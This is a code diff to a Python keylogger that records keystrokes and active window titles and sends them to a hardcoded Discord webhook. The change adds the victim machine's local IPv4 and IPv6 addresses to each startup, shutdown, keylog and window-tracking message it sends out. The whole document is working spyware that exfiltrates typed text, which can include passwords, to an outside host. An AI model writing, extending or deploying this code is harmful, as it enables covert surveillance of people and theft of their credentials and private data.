@@ -16,6 +16,23 @@ WEBHOOK_URL = "https://discordapp.com/api/webhooks/1355720476252704798/QfHQTbLam
 # Get PC name
 PC_NAME = socket.gethostname()
 
+# Function to get local IPv4 and IPv6 addresses
+def get_local_ips():
+    ipv4, ipv6 = "Unknown", "Unknown"
+    try:
+        hostname = socket.gethostname()
+        ipv4 = socket.gethostbyname(hostname)
+        for addr in socket.getaddrinfo(hostname, None):
+            if addr[0] == socket.AF_INET6:
+                ipv6 = addr[4][0]
+                break
+    except socket.error as e:
+        print(f"Error fetching IP addresses: {e}")
+    return ipv4, ipv6
+
+# Get IP Addresses
+IPV4_ADDRESS, IPV6_ADDRESS = get_local_ips()
+
 # Tracking Variables
 last_logged = None
 keystrokes = ""
@@ -41,13 +58,13 @@ def send_to_discord(title, description, color):
 # Function to log system startup
 def log_system_start():
     timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-    message = f"[{timestamp}] {PC_NAME} - Connection Established"
+    message = f"[{timestamp}] {PC_NAME} (IPv4: {IPV4_ADDRESS}, IPv6: {IPV6_ADDRESS}) - Connection Established"
     send_to_discord("SYSTEM START", message, 65280)  # Green
 
 # Function to log system shutdown
 def log_system_shutdown():
     timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-    message = f"[{timestamp}] {PC_NAME} - Connection Lost"
+    message = f"[{timestamp}] {PC_NAME} (IPv4: {IPV4_ADDRESS}, IPv6: {IPV6_ADDRESS}) - Connection Lost"
     send_to_discord("SYSTEM SHUTDOWN", message, 16711680)  # Red
 
 # Register shutdown hook
@@ -74,7 +91,7 @@ def send_keystrokes():
     with keystroke_lock:
         if keystrokes.strip():
             timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-            message = f"[{timestamp}] {PC_NAME} ({keystroke_app} - {keystroke_window}): {keystrokes}"
+            message = f"[{timestamp}] {PC_NAME} (IPv4: {IPV4_ADDRESS}, IPv6: {IPV6_ADDRESS}) ({keystroke_app} - {keystroke_window}): {keystrokes}"
             send_to_discord("KEYLOG", message, 16776960)  # Yellow
             keystrokes = ""
             keystroke_app, keystroke_window = "Unknown", "Unknown"
@@ -124,7 +141,7 @@ def monitor():
             new_app_name, new_window_title = get_active_window_title()
             if new_app_name and new_window_title and (new_app_name, new_window_title) != last_logged:
                 timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-                message = f"[{timestamp}] {PC_NAME} - Active Window: {new_app_name} ({new_window_title})"
+                message = f"[{timestamp}] {PC_NAME} (IPv4: {IPV4_ADDRESS}, IPv6: {IPV6_ADDRESS}) - Active Window: {new_app_name} ({new_window_title})"
                 send_to_discord("WINDOW ACTIVE", message, 255)  # Blue
                 last_logged = (new_app_name, new_window_title)
             time.sleep(1)
